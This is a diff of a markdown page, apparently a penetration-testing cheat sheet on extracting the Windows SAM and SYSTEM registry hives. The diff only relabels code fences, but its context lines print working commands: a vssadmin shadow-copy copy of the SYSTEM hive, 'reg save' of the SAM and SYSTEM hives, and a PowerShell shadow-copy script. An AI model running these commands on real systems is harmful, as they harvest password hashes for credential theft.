@@ -10,7 +10,7 @@ The SAM and SYSTEM hives hold the necessary information to acquire authenticatio
 
 ### Volume Shadow Copy Service
 
-```
+``` text
 vssadmin create shadow /for=c: #if required
 vssadmin list shadows
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<#_from_above>\windows\system32\config\SYSTEM .
@@ -21,7 +21,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<#_from_above>\windows\system
 
 ### Registry Access
 
-```
+``` text
 reg save hklm\sam SAM
 reg save hklm\system SYSTEM
 ```
@@ -30,7 +30,7 @@ reg save hklm\system SYSTEM
 
 ### PowerShell Script
 
-```
+``` text
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
 $id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
